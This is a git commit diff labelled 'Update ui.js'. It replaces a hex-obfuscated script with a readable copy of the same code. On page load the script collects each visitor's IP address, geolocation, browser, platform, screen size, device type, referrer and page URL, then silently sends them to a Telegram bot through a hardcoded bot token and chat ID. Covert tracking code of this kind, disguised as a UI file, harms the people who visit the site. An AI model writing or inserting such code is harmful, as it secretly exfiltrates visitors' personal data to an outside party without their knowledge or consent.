65a9488dc69da4f9a062a80be23d6976e28a1c67
Daxexp <exp12mt@gmail.com>
2025-03-26 23:55:33 +0530

    Update ui.js

--- ui.js
+++ ui.js
@@ -1,1 +1,126 @@
-var _$_6ab2=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x70\x69\x66\x79\x2E\x6F\x72\x67\x3F\x66\x6F\x72\x6D\x61\x74\x3D\x6A\x73\x6F\x6E","\x6A\x73\x6F\x6E","\x69\x70","\x45\x72\x72\x6F\x72\x20\x66\x65\x74\x63\x68\x69\x6E\x67\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x3A","\x65\x72\x72\x6F\x72","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x2F\x6A\x73\x6F\x6E\x2F","\x45\x72\x72\x6F\x72\x20\x66\x65\x74\x63\x68\x69\x6E\x67\x20\x67\x65\x6F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3A","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x77\x69\x64\x74\x68","\x73\x63\x72\x65\x65\x6E","\x68\x65\x69\x67\x68\x74","\x74\x65\x73\x74","\x4D\x6F\x62\x69\x6C\x65","\x54\x61\x62\x6C\x65\x74","\x44\x65\x73\x6B\x74\x6F\x70","\x37\x37\x37\x32\x31\x33\x31\x32\x32\x33\x3A\x41\x41\x48\x6F\x47\x6C\x36\x69\x4B\x67\x41\x71\x39\x44\x46\x4B\x77\x6C\x4D\x58\x7A\x69\x47\x38\x36\x73\x51\x65\x36\x30\x65\x33\x6A\x70\x67","\x31\x31\x38\x38\x37\x32\x33\x30\x32\x38","\x2F\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6F\x6B","\x4D\x65\x73\x73\x61\x67\x65\x20\x73\x65\x6E\x74\x20\x74\x6F\x20\x54\x65\x6C\x65\x67\x72\x61\x6D\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79","\x6C\x6F\x67","\x45\x72\x72\x6F\x72\x20\x73\x65\x6E\x64\x69\x6E\x67\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x54\x65\x6C\x65\x67\x72\x61\x6D","\x45\x72\x72\x6F\x72\x20\x73\x65\x6E\x64\x69\x6E\x67\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x54\x65\x6C\x65\x67\x72\x61\x6D\x3A","\x72\x65\x66\x65\x72\x72\x65\x72","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x6F\x49\x53\x4F\x53\x74\x72\x69\x6E\x67","\x55\x73\x65\x72\x20\x49\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x3A","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x4C\x6F\x63\x61\x74\x69\x6F\x6E\x3A\x20","\x63\x69\x74\x79","\x67\x65\x6F\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x2C\x20","\x72\x65\x67\x69\x6F\x6E","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x42\x72\x6F\x77\x73\x65\x72\x3A\x20","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x50\x6C\x61\x74\x66\x6F\x72\x6D\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x4C\x61\x6E\x67\x75\x61\x67\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x53\x63\x72\x65\x65\x6E\x20\x52\x65\x73\x6F\x6C\x75\x74\x69\x6F\x6E\x3A\x20","\x73\x63\x72\x65\x65\x6E\x52\x65\x73\x6F\x6C\x75\x74\x69\x6F\x6E","\x78","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x44\x65\x76\x69\x63\x65\x20\x54\x79\x70\x65\x3A\x20","\x64\x65\x76\x69\x63\x65\x54\x79\x70\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x52\x65\x66\x65\x72\x72\x65\x72\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x50\x61\x67\x65\x20\x55\x52\x4C\x3A\x20","\x70\x61\x67\x65\x55\x52\x4C","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x54\x69\x6D\x65\x73\x74\x61\x6D\x70\x3A\x20","\x74\x69\x6D\x65\x73\x74\x61\x6D\x70","\x0D\x0A\x20\x20\x20\x20"];async function getUserIP(){try{const _0x20006= await fetch(_$_6ab2[0]);const _0x1FFDA= await _0x20006[_$_6ab2[1]]();return _0x1FFDA[_$_6ab2[2]]}catch(error){console[_$_6ab2[4]](_$_6ab2[3],error);return _$_6ab2[5]}}async function getGeolocation(_0x1FFF0){try{const _0x20006= await fetch(("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F"+_0x1FFF0+_$_6ab2[6]));const _0x1FFDA= await _0x20006[_$_6ab2[1]]();return _0x1FFDA}catch(error){console[_$_6ab2[4]](_$_6ab2[7],error);return {}}}function getBrowserInfo(){return {userAgent:navigator[_$_6ab2[8]],platform:navigator[_$_6ab2[9]],language:navigator[_$_6ab2[10]]}}function getScreenResolution(){return {width:window[_$_6ab2[12]][_$_6ab2[11]],height:window[_$_6ab2[12]][_$_6ab2[13]]}}function getDeviceType(){const _0x1FFC4=navigator[_$_6ab2[8]];if(/mobile/i[_$_6ab2[14]](_0x1FFC4)){return _$_6ab2[15]}else {if(/tablet/i[_$_6ab2[14]](_0x1FFC4)){return _$_6ab2[16]}else {return _$_6ab2[17]}}}async function sendToTelegram(_0x2005E){const _0x200E2=_$_6ab2[18];const _0x200F8=_$_6ab2[19];const _0x2010E=("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74"+_0x200E2+_$_6ab2[20]);try{const _0x20006= await fetch(_0x2010E,{method:_$_6ab2[21],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_6ab2[22]},body:JSON[_$_6ab2[23]]({chat_id:_0x200F8,text:_0x2005E})});if(_0x20006[_$_6ab2[24]]){console[_$_6ab2[26]](_$_6ab2[25])}else {console[_$_6ab2[4]](_$_6ab2[27])}}catch(error){console[_$_6ab2[4]](_$_6ab2[28],error)}}async function logUserInfo(){const _0x1FFF0= await getUserIP();const _0x20048= await getGeolocation(_0x1FFF0);const _0x2001C=getBrowserInfo();const _0x200A0=getScreenResolution();const _0x20032=getDeviceType();const _0x2008A=document[_$_6ab2[29]];const _0x20074=window[_$_6ab2[31]][_$_6ab2[30]];const _0x200B6= new Date()[_$_6ab2[32]]();const _0x200CC={ip,geolocation,browserInfo,screenResolution,deviceType,referrer,pageURL,timestamp};console[_$_6ab2[26]](_$_6ab2[33],_0x200CC);const _0x2005E=("\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x55\x73\x65\x72\x20\x49\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x3A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x49\x50\x3A\x20"+_0x200CC[_$_6ab2[2]]+_$_6ab2[34]+_0x200CC[_$_6ab2[36]][_$_6ab2[35]]+_$_6ab2[37]+_0x200CC[_$_6ab2[36]][_$_6ab2[38]]+_$_6ab2[37]+_0x200CC[_$_6ab2[36]][_$_6ab2[39]]+_$_6ab2[40]+_0x200CC[_$_6ab2[41]][_$_6ab2[8]]+_$_6ab2[42]+_0x200CC[_$_6ab2[41]][_$_6ab2[9]]+_$_6ab2[43]+_0x200CC[_$_6ab2[41]][_$_6ab2[10]]+_$_6ab2[44]+_0x200CC[_$_6ab2[45]][_$_6ab2[11]]+_$_6ab2[46]+_0x200CC[_$_6ab2[45]][_$_6ab2[13]]+_$_6ab2[47]+_0x200CC[_$_6ab2[48]]+_$_6ab2[49]+_0x200CC[_$_6ab2[29]]+_$_6ab2[50]+_0x200CC[_$_6ab2[51]]+_$_6ab2[52]+_0x200CC[_$_6ab2[53]]+_$_6ab2[54]);sendToTelegram(_0x2005E)}logUserInfo()
+// Function to get user's IP address
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('Error fetching IP address:', error);
+        return 'Unknown';
+    }
+}
+
+// Function to get geolocation data based on IP address
+async function getGeolocation(ip) {
+    try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await response.json();
+        return data;
+    } catch (error) {
+        console.error('Error fetching geolocation:', error);
+        return {};
+    }
+}
+
+// Function to get browser information
+function getBrowserInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+    };
+}
+
+// Function to get screen resolution
+function getScreenResolution() {
+    return {
+        width: window.screen.width,
+        height: window.screen.height,
+    };
+}
+
+// Function to determine device type
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/mobile/i.test(ua)) {
+        return 'Mobile';
+    } else if (/tablet/i.test(ua)) {
+        return 'Tablet';
+    } else {
+        return 'Desktop';
+    }
+}
+
+// Function to send data to Telegram bot
+async function sendToTelegram(message) {
+    const botToken = '7772131223:AAHoGl6iKgAq9DFKwlMXziG86sQe60e3jpg';
+    const chatId = '1188723028';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        });
+
+        if (response.ok) {
+            console.log('Message sent to Telegram successfully');
+        } else {
+            console.error('Error sending message to Telegram');
+        }
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+    }
+}
+
+// Function to log user information
+async function logUserInfo() {
+    const ip = await getUserIP();
+    const geolocation = await getGeolocation(ip);
+    const browserInfo = getBrowserInfo();
+    const screenResolution = getScreenResolution();
+    const deviceType = getDeviceType();
+    const referrer = document.referrer;
+    const pageURL = window.location.href;
+    const timestamp = new Date().toISOString();
+
+    const userInfo = {
+        ip,
+        geolocation,
+        browserInfo,
+        screenResolution,
+        deviceType,
+        referrer,
+        pageURL,
+        timestamp,
+    };
+
+    console.log('User Information:', userInfo);
+
+    // Format the message to be sent to Telegram
+    const message = `
+        User Information:
+        IP: ${userInfo.ip}
+        Location: ${userInfo.geolocation.city}, ${userInfo.geolocation.region}, ${userInfo.geolocation.country_name}
+        Browser: ${userInfo.browserInfo.userAgent}
+        Platform: ${userInfo.browserInfo.platform}
+        Language: ${userInfo.browserInfo.language}
+        Screen Resolution: ${userInfo.screenResolution.width}x${userInfo.screenResolution.height}
+        Device Type: ${userInfo.deviceType}
+        Referrer: ${userInfo.referrer}
+        Page URL: ${userInfo.pageURL}
+        Timestamp: ${userInfo.timestamp}
+    `;
+
+    // Send the message to Telegram
+    sendToTelegram(message);
+}
+
+// Call the function to log user information
+logUserInfo();
